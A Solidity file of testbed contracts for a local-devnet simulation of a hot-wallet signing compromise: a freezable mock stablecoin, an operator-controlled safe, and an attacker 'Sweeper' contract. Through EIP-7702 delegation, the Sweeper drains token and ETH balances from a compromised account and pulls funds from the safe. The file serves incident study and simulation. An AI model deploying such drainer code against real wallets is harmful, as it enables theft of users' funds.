// SPDX-License-Identifier: MIT
// Testbed contracts for the signing-path compromise simulation.
// Local devnet only. Mirrors the publicly documented Oct 29, 2026 incident.
pragma solidity 0.8.28;

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address who) external view returns (uint256);
}

/// Stablecoin with an issuer-controlled freeze, like USDT/USDC.
contract MockStable {
    string public name;
    address public immutable issuer;
    mapping(address => uint256) public balanceOf;
    mapping(address => bool) public frozen;
    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor(string memory n) { name = n; issuer = msg.sender; }

    function mint(address to, uint256 amount) external {
        require(msg.sender == issuer, "issuer");
        balanceOf[to] += amount;
        emit Transfer(address(0), to, amount);
    }

    function freeze(address who) external {
        require(msg.sender == issuer, "issuer");
        frozen[who] = true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(!frozen[msg.sender] && !frozen[to], "frozen");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }
}

/// Smart wallet whose operator is a hot-wallet EOA (the "Hot Wallet 34" pattern).
contract OperatorSafe {
    address public immutable operator;
    constructor(address op) { operator = op; }
    function execute(address token, address to, uint256 amount) external {
        require(msg.sender == operator, "not operator");
        IERC20(token).transfer(to, amount);
    }
}

/// Attacker delegate code: only the hard-coded operator may call it.
/// When an EOA delegates to it via EIP-7702, address(this) is the EOA.
contract Sweeper {
    address public immutable op;
    constructor(address o) { op = o; }

    function sweep(address payable to, address[] calldata tokens) external {
        require(msg.sender == op, "op");
        for (uint256 i = 0; i < tokens.length; i++) {
            uint256 b = IERC20(tokens[i]).balanceOf(address(this));
            if (b > 0) IERC20(tokens[i]).transfer(to, b);
        }
        uint256 e = address(this).balance;
        if (e > 1 ether) to.transfer(e - 1 ether);
    }

    function pull(address safe, address token, address to, uint256 amount) external {
        require(msg.sender == op, "op");
        OperatorSafe(safe).execute(token, to, amount);
    }

    receive() external payable {}
}
